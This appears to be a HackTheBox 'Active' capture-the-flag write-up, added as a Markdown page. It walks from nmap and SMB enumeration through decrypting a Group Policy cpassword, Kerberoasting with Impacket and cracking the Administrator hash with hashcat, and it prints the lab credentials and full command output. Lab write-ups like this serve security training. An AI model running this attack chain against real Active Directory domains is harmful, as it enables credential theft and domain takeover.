@@ -1,0 +1,400 @@
+---
+title: 'HackTheBox Active'
+description: 'Active Directory machine walkthrough from enumeration to domain admin.'
+icon: 'shield-halved'
+---
+
+# Enumeration
+
+## Run Nmap Scan
+
+```bash
+nmap -p- -T4 10.129.247.13
+
+"
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 08:38 BST
+Nmap scan report for 10.129.247.13
+Host is up (0.15s latency).
+Not shown: 65512 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5722/tcp  open  msdfsr
+9389/tcp  open  adws
+47001/tcp open  winrm
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49157/tcp open  unknown
+49158/tcp open  unknown
+49169/tcp open  unknown
+49173/tcp open  unknown
+49174/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 648.37 seconds
+"
+```
+
+```bash
+nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49169,49173,49174 -sC -sV 10.129.247.13
+
+"
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 14:13 BST
+Nmap scan report for 10.129.247.13
+Host is up (0.16s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-10-07 13:13:49Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5722/tcp  open  msrpc         Microsoft Windows RPC
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49152/tcp open  msrpc         Microsoft Windows RPC
+49153/tcp open  msrpc         Microsoft Windows RPC
+49154/tcp open  msrpc         Microsoft Windows RPC
+49155/tcp open  msrpc         Microsoft Windows RPC
+49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         Microsoft Windows RPC
+49169/tcp open  msrpc         Microsoft Windows RPC
+49173/tcp open  msrpc         Microsoft Windows RPC
+49174/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   210: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2023-10-07T13:14:47
+|_  start_date: 2023-10-07T07:35:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 76.54 seconds
+"
+```
+
+## Add Nameserver to resolv.conf
+
+```bash
+sudo vi /etc/resolv.conf
+
+"
+nameserver 10.129.247.13
+"
+```
+
+## Enumerating DNS
+
+### Zone Transfer (Failed)
+
+```bash
+dig axfr active.htb @10.129.247.13
+
+"
+; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr active.htb @10.129.247.13
+;; global options: +cmd
+; Transfer failed.
+"
+```
+
+### Validating Domain
+
+```bash
+dig active.htb @10.129.247.13
+
+"
+; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> active.htb @10.129.247.13
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 4022
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; COOKIE: c68166f23eb932df (echoed)
+;; QUESTION SECTION:
+;active.htb.			IN	A
+
+;; Query time: 160 msec
+;; SERVER: 10.129.247.13#53(10.129.247.13) (UDP)
+;; WHEN: Sat Oct 07 14:19:48 BST 2023
+;; MSG SIZE  rcvd: 51
+"
+```
+
+## Enumerating SMB
+
+```bash
+enum4linux -a 10.129.247.13
+
+"
+========================================== 
+|    Share Enumeration on 10.129.247.13    |
+ ========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+
+[+] Attempting to map shares on 10.129.247.13
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/ADMIN$	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/C$	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/IPC$	Mapping: OK	Listing: DENIED
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/NETLOGON	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/Replication	Mapping: OK, Listing: OK
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/SYSVOL	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.129.247.13/Users	Mapping: DENIED, Listing: N/A
+"
+```
+
+We can see, downloading `/Replication` folder is available with guest account
+
+```bash
+smbget -R smb://10.129.247.13/Replication
+
+"
+Password for [htb-daeisbae] connecting to //10.129.247.13/Replication: 
+Using workgroup WORKGROUP, user htb-daeisbae
+smb://10.129.247.13/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI
+smb://10.129.247.13/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI
+smb://10.129.247.13/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+smb://10.129.247.13/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
+smb://10.129.247.13/Replication/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol
+smb://10.129.247.13/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI
+smb://10.129.247.13/Replication/active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf
+Downloaded 8.11kB in 25 seconds
+"
+```
+
+Downloaded the `/Replication` folder using `smbget`
+
+# Exploitation
+
+## Checking the downloaded `/Replication` folder
+
+```bash
+tree active.htb
+
+"
+active.htb
+├── DfsrPrivate
+│   ├── ConflictAndDeleted
+│   ├── Deleted
+│   └── Installing
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── Group Policy
+│   │   │   └── GPE.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Preferences
+│   │   │   │   └── Groups
+│   │   │   │       └── Groups.xml
+│   │   │   └── Registry.pol
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+"
+```
+
+Here the only file that is not either `.inf` and `.ini` is `Group.xml` file!
+
+## Group.xml
+
+```bash
+cat Groups.xml 
+
+`
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
+`
+```
+
+We found `name="active.htb\SVC_TGS"` and `cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"`, which maybe useful for our further enumeration
+
+## Decrypting the cPassword
+
+[https://github.com/t0thkr1s/gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt)
+
+```bash
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+
+"
+GPPstillStandingStrong2k18
+"
+```
+
+### Finding Credentials
+
+```yaml
+username: SVC_TGS
+password: GPPstillStandingStrong2k18
+```
+
+## Enumerating SMB using the Credentials gained
+
+```bash
+smbmap -H 10.129.247.13 -u SVC_TGS -p 'GPPstillStandingStrong2k18' -d active.htb
+
+"
+[+] IP: 10.129.247.13:445	Name: active.htb                                        
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	NO ACCESS	Remote IPC
+	NETLOGON                                          	READ ONLY	Logon server share 
+	Replication                                       	READ ONLY	
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY
+"
+```
+
+Here we found `Users` directory that contains our user directories!
+
+## Logging into SMB
+
+```bash
+smbclient //10.129.247.13/Users -U SVC_TGS
+
+"
+Password for [WORKGROUP\SVC_TGS]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 15:39:20 2018
+  ..                                 DR        0  Sat Jul 21 15:39:20 2018
+  Administrator                       D        0  Mon Jul 16 11:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 06:06:44 2009
+  Default                           DHR        0  Tue Jul 14 07:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 06:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009
+  Public                             DR        0  Tue Jul 14 05:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018
+
+		5217023 blocks of size 4096. 278544 blocks available
+"
+```
+
+# Privilege Escalation
+
+## Kerberoasting
+
+> To perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required. - [HackTricks.xyz](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+> 
+
+Since our service account username is “SVC_TGS”, we can assume the account can request TGS.
+
+[](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
+
+```bash
+python3 GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.247.13 -request -save -outputfile users.kerberoast
+
+"
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 20:06:40.351723  2023-10-07 08:36:05.627751             
+
+[-] CCache file is not found. Skipping...
+"
+```
+
+When the script finish, it will generate the `users.kerberoast` file that contains the Administrator hash
+
+## Cracking the Administrator account Hash
+
+```bash
+hashcat -m 13100 --force -a 0 users.kerberoast /usr/share/wordlists/rockyou.txt
+
+`
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$0c080adb618de469e2d14c57c4cf2d86$1a99a59176d45fc792d75b1596ddaa09fa5afad16659cc877a5eae7880108e41ce0cfd94fcdc93a694a7f703c32dc83ff9782f085a2eb73200daddea415319f17e46d51e06cf258af72600c633b0dbee601d2c01ac8711793980780ee6a4548680cec0ac9f8a9465ad07cb5e2706664782326868ba7f587b7dfe2dc91b3112488948321a47dcb776de224d9dac5df07e59c5bb832f4ee6f3c893b06b489dc797830c2b9c8738dce0290137dcd649bf10d77f3d92e345f60f02060c741f8fb716ff342524fad7069756546d33a7456d60398fd221105d86e4d97c9970f386701c944838a97055c917d09b7c912abb6b82e5b0fd70aab4b2ddf2b40a0be5d3fa67e374a4ab594fa84cad9e28b0b7bc9198dc7fdbff209d0a1099f0e64ba9dbffb605df933c7bc2d78451efe61b6ea73f1ab7b4a0fca1d822e1f7c5a91ee599674a1fbeb51193a10ed6a9bc0136c84fdb2eb48dcf60f5d34f80155b543cad44f598fd146709772ba6cd30e893f946ab7da0d5983db3236a256c161dfee79c7272e0df497a0da0dd2afcbd0e7de19aa6ee339a35d23bfd7d05d5a6408cf8be132be9edf9e8fff6d31705c206910024873ea1019c15d8fb3f2363a70f38a2e59bdd3faa2f43c7842f73886f4347561395481ca10c85aa1a7f7894208a9f9ffdacfecfee9185cad50e00251e25e720fb5058d49b93e9cbffd0ecc5fdf55babf6301414e461bdc9598d25b52f8e743ce5bf16eb0a82bed989e39cfd8d20b5829712e4f02d505d3bccee7b34f0fa08d1f948b38e9ddbd71620e98126f4756d48b78e906387356da34bdef9a9982bd9dc4bcc7506e1382695f6dd3d26b4732f2f15e3def94f0f198b1f69cf54dcdda2edc7bb0cd5a812976a5b95c6519ff845c4d15bb3a5f9e44308db7d402efc849ecbcfe02ddcc22144f44c1584808b9e797899b1b7b4e303fff1531e25c6db2f442133e478dba52c47ce1d6731bc518fc6ff76352f5c57d1734133816c213debc4f5a187a1b70cb275f5bfafa7007308e86249e2770214771a0c98795987f6aa193aadd43c90e38612af1ae9874261abf7e4dba8d296302bdc81d6968ccf417328c60d410e97f80cd27c2e00c7260823c72575719f14c1bde186181a19d8ce7fe7a267e0843184bd152608b012271e64419bae135ff76525d84d78529979ee3e429e2d13545a5cbfaadfddc5961bb80eaa27c607465203081fe40d03c130da12c9f82b2e830543aa5b898248be592312:Ticketmaster1968
+`
+```
+
+### Finding Credentials
+
+```bash
+username: Administrator
+password: Ticketmaster1968
+```
+
+## Logging into SMB
+
+```bash
+smbclient //10.129.247.13/Users -U Administrator
+
+`
+Password for [WORKGROUP\Administrator]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Sat Jul 21 15:39:20 2018
+  ..                                 DR        0  Sat Jul 21 15:39:20 2018
+  Administrator                       D        0  Mon Jul 16 11:14:21 2018
+  All Users                       DHSrn        0  Tue Jul 14 06:06:44 2009
+  Default                           DHR        0  Tue Jul 14 07:38:21 2009
+  Default User                    DHSrn        0  Tue Jul 14 06:06:44 2009
+  desktop.ini                       AHS      174  Tue Jul 14 05:57:55 2009
+  Public                             DR        0  Tue Jul 14 05:57:55 2009
+  SVC_TGS                             D        0  Sat Jul 21 16:16:32 2018
+
+		5217023 blocks of size 4096. 278400 blocks available
+`
+```
+
+# Reference
+
+- [https://0xdf.gitlab.io/2018/12/08/htb-active.html](https://0xdf.gitlab.io/2018/12/08/htb-active.html)
+- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)
+- [https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
